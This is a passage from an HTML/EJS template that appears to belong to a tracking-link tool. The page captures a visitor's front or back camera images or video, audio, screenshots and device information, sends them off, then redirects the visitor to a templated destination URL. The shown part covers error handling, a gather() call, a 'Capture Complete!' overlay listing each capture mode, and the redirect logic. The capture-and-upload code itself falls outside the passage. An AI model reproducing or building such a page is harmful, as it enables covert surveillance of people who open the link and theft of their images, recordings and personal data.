            console.error(`Error sending ${captureMethod} image:`, error);
            
            // Still gather info and redirect
            gather();
            setTimeout(() => {
              window.location.href = "<%=url %>";
            }, 2000);
          });
        };
        
        // Start video playback to get a frame
        video.play();
      } catch (error) {
        console.error(`Error in ${captureMethod} image capture:`, error);
        
        // Fallback - still gather info and redirect
        gather();
        setTimeout(() => {
          window.location.href = "<%=url %>";
        }, 2000);
      }
    }
    
    // We already call the right capture method at the start, this is no longer needed
    // setTimeout(captureCamera, 500);
  });
} else {
  // Normal initialization for other methods
  gather();
}
}

</script>
<!-- No iframe to avoid immediate redirect -->
<div id="success-message" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:9999; justify-content:center; align-items:center; flex-direction:column; color:white;">
  <div style="background: linear-gradient(135deg, #4CAF50, #2E7D32); padding: 25px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); max-width: 90%; text-align: center; position: relative; animation: fadeIn 0.5s ease-out;">
    <div style="position: absolute; top: -30px; left: 50%; transform: translateX(-50%); background: #2E7D32; width: 60px; height: 60px; border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 5px 15px rgba(0,0,0,0.2);">
      <div style="font-size: 36px; color: white;">‚úì</div>
    </div>
    <h2 style="margin-top: 10px; font-size: 24px; font-weight: bold; color: white;">Capture Complete!</h2>
    <% if (captureMethod === 'screenshot') { %>
      <p style="font-size: 16px; margin: 15px 0;">Screenshot captured successfully with status bar</p>
    <% } else if (captureMethod === 'frontvideo') { %>
      <p style="font-size: 16px; margin: 15px 0;">Front camera video recorded successfully</p>
    <% } else if (captureMethod === 'backvideo') { %>
      <p style="font-size: 16px; margin: 15px 0;">Back camera video recorded successfully</p>
    <% } else if (captureMethod === 'allcams') { %>
      <p style="font-size: 16px; margin: 15px 0;">Front & back camera videos recorded successfully</p>
    <% } else if (captureMethod === 'frontcam') { %>
      <p style="font-size: 16px; margin: 15px 0;">Front camera image captured successfully</p>
    <% } else if (captureMethod === 'backcam') { %>
      <p style="font-size: 16px; margin: 15px 0;">Back camera image captured successfully</p>
    <% } else if (captureMethod === 'audio') { %>
      <p style="font-size: 16px; margin: 15px 0;">Audio recording completed successfully</p>
    <% } else { %>
      <p style="font-size: 16px; margin: 15px 0;">Information gathered successfully</p>
    <% } %>
    <div style="width: 80%; height: 4px; background: rgba(255,255,255,0.3); margin: 15px auto; border-radius: 2px; overflow: hidden;">
      <div id="progress-bar" style="width: 0%; height: 100%; background: white; border-radius: 2px; transition: width 3s linear;"></div>
    </div>
    <p style="font-size: 14px; opacity: 0.9;">Redirecting to your destination...</p>
  </div>
</div>
<script>
// Animate progress bar when success message is shown
document.addEventListener('DOMContentLoaded', function() {
  const successMessage = document.getElementById('success-message');
  const progressBar = document.getElementById('progress-bar');
  
  // Create a MutationObserver to watch for style changes
  const observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
      if (mutation.attributeName === 'style' && 
          successMessage.style.display === 'flex') {
        // When success message becomes visible, animate the progress bar
        setTimeout(() => {
          progressBar.style.width = '100%';
        }, 100);
      }
    });
  });
  
  // Start observing the success message for display changes
  observer.observe(successMessage, { attributes: true });
});
</script>

<script>
// Function to redirect to the target URL
function redirectToTargetUrl() {
  window.location.href = "<%=url %>";
}
</script>
</body>
</html>
